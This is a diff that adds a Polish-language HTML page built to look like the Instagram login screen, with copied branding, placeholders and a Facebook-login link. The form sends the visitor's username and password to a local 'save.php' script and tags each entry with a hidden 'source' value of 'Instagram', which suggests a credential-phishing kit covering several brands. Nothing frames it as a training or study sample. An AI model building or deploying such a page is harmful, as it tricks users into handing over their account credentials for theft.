@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram – Zaloguj się</title>
+  <style>
+    body {
+      background-color: #000;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      max-width: 300px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .logo {
+      font-family: 'Billabong', cursive;
+      font-size: 48px;
+      margin-bottom: 30px;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      background-color: #121212;
+      border: 1px solid #262626;
+      border-radius: 3px;
+      color: #fff;
+    }
+
+    button {
+      width: 100%;
+      padding: 8px;
+      background-color: #3897f0;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-weight: bold;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    .divider {
+      margin: 20px 0;
+      display: flex;
+      align-items: center;
+      text-align: center;
+      color: #8e8e8e;
+    }
+
+    .divider::before, .divider::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #262626;
+    }
+
+    .divider:not(:empty)::before {
+      margin-right: .5em;
+    }
+
+    .divider:not(:empty)::after {
+      margin-left: .5em;
+    }
+
+    .facebook-login {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #0095f6;
+      font-weight: 500;
+      margin: 10px 0;
+      text-decoration: none;
+    }
+
+    .facebook-login img {
+      width: 16px;
+      height: 16px;
+      margin-right: 8px;
+    }
+
+    .forgot {
+      color: #b3b3b3;
+      font-size: 12px;
+      margin: 15px 0;
+    }
+
+    .report {
+      color: #8e8e8e;
+      font-size: 11px;
+      margin: 15px 0;
+    }
+
+    .report a {
+      color: #0095f6;
+      text-decoration: none;
+    }
+
+    .signup {
+      color: #8e8e8e;
+      font-size: 13px;
+    }
+
+    .signup a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">Instagram</div>
+
+    <!-- Formularz z wymaganymi polami -->
+    <form action="save.php" method="POST">
+      <input type="hidden" name="source" value="Instagram">
+      <input type="text" name="username" placeholder="Numer telefonu, nazwa użytkownika lub adres e-mail" required>
+      <input type="password" name="password" placeholder="Hasło" required>
+      <button type="submit">Zaloguj się</button>
+    </form>
+
+    <div class="divider">LUB</div>
+
+    <a href="#" class="facebook-login">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+      Zaloguj się przez Facebooka
+    </a>
+
+    <div class="forgot">Nie pamiętasz hasła?</div>
+
+    <div class="report">
+      Możesz też <a href="#">zgłosić zawartość</a>, którą uważasz za niezgodną z prawem obowiązującym w Twoim kraju bez logowania się.
+    </div>
+
+    <div class="signup">
+      Nie masz konta? <a href="#">Zarejestruj się</a>
+    </div>
+  </div>
+</body>
+</html>
